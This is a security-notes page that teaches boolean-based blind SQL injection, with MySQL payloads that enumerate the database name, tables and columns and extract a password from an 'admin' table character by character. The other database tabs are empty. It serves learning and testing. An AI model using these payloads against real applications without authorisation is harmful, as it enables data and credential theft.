# Boolean Based

## Theory

Boolean-based SQL injection is a technique that relies on sending an SQL query to the database based on which the technique forces the application to return different results.\
The result allows an attacker to judge whether the payload used returns true or false. Even though no data from the database are recovered, the results give the attacker valuable information. Depending on the boolean result (TRUE or FALSE), the content within the response will change, or remain the same.

## Practice

#### Getting database

{% tabs %}
{% tab title="MySQL" %}
First, retrieve the database length:

```sql
1' AND (SELECT LENGTH(database()))=1-- -  #False  
1' AND (SELECT LENGTH(database()))=2-- -  #False
1' AND (SELECT LENGTH(database()))=3-- -  #True -> It means the length of database is 3 characters.
```

Second, retrieve the database name:

```sql
--True -> It means the first character is p. Note that ASCII code is in decimal
1' AND (SELECT HEX(SUBSTRING(database(), 1, 1)))=HEX('p')-- -
1' AND (SELECT ASCII(SUBSTRING(database(), 1, 1)))=112-- - 

--True -> It means the second character is w.
1' AND (SELECT HEX(SUBSTRING(database(), 2, 1)))=HEX('w')-- -

--True -> It means the third character is n.
1' AND (SELECT HEX(SUBSTRING(database(), 3, 1)))=HEX('n')-- -
```
{% endtab %}

{% tab title="MSSQL" %}
```sql
```
{% endtab %}

{% tab title="OracleSQL" %}
```sql
```
{% endtab %}

{% tab title="PostgreSQL" %}
```sql
```
{% endtab %}

{% tab title="SQLite" %}
```sql
```
{% endtab %}
{% endtabs %}

####

#### Getting Tables

{% tabs %}
{% tab title="MySQL" %}
First, retrieve the number of tables:

```sql
1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=2-- -  #True -> 2 tables
```

Second, retrieve length of each table

```sql
-- If True, the first table lenght is 5
1' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)=5-- - 

-- If True, the second table lenght is 5
1' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)=5-- - 
```

Third, retrieve name of each table

```sql
-- If True, the first char of the first table is u
1'AND (SELECT HEX(SUBSTRING(table_name, 1, 1))FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)=HEX('u')-- -

-- If True, the second char of the first table is s
1'AND (SELECT HEX(SUBSTRING(table_name, 2, 1)) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)=HEX('s')-- -

-- If True, the first char of the second table is p
1'AND (SELECT HEX(SUBSTRING(table_name, 1, 1)) FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)=HEX('p')-- -
```
{% endtab %}

{% tab title="MSSQL" %}
```sql
```
{% endtab %}

{% tab title="OracleSQL" %}
```sql
```
{% endtab %}

{% tab title="PostgreSQL" %}
```sql
```
{% endtab %}

{% tab title="SQLite" %}
```sql
```
{% endtab %}
{% endtabs %}

####

#### Getting Columns

{% tabs %}
{% tab title="MySQL" %}
First, retrieve the number of columns:

```sql
1' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='admin')=2-- -  #True -> 2 columns
```

Second, retrieve length of each column

```sql
-- If True, the first column's name lenght is 3
1' AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='admin' LIMIT 0,1)=3-- - 

-- If True, the second table's name lenght is 8
1' AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='admin' LIMIT 1,1)=8-- - 
```

Third, retrieve name of each column

```sql
-- If True, the first char of the first column is a
1'AND (SELECT HEX(SUBSTRING(column_name, 1, 1))FROM information_schema.columns WHERE table_schema=database() AND table_name='admin' LIMIT 0,1)=HEX('a')-- -

-- If True, the second char of the first column is b
1'AND (SELECT HEX(SUBSTRING(column_name, 2, 1))FROM information_schema.columns WHERE table_schema=database() AND table_name='admin' LIMIT 0,1)=HEX('b')-- -

-- If True, the first char of the second column is p
1'AND (SELECT HEX(SUBSTRING(column_name, 1, 1))FROM information_schema.columns WHERE table_schema=database() AND table_name='admin' LIMIT 1,1)=HEX('p')-- -
```
{% endtab %}

{% tab title="MSSQL" %}
```sql
```
{% endtab %}

{% tab title="OracleSQL" %}
```sql
```
{% endtab %}

{% tab title="PostgreSQL" %}
```sql
```
{% endtab %}

{% tab title="SQLite" %}
```sql
```
{% endtab %}
{% endtabs %}



#### Dump values

{% tabs %}
{% tab title="MySQL" %}
First, retrieve the lenght of the value (we take password column as example):

```sql
1' AND (SELECT LENGTH(password) FROM admin LIMIT 0,1)=9-- -  #True -> 1st password is 9 char
```

Second, retrieve values

```sql
-- If True, the first password's char is p
1'AND (SELECT HEX(SUBSTRING(password, 1, 1))FROM admin LIMIT 0,1)=HEX('p')-- -

-- If True, the second password's char is a
1'AND (SELECT HEX(SUBSTRING(password, 2, 1))FROM admin LIMIT 0,1)=HEX('a')-- -
```
{% endtab %}

{% tab title="MSSQL" %}
```sql
```
{% endtab %}

{% tab title="OracleSQL" %}
```sql
```
{% endtab %}

{% tab title="PostgreSQL" %}
```sql
```
{% endtab %}

{% tab title="SQLite" %}
```sql
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://portswigger.net/web-security/sql-injection" %}

{% embed url="https://defendtheweb.net/article/blind-sql-injection" %}
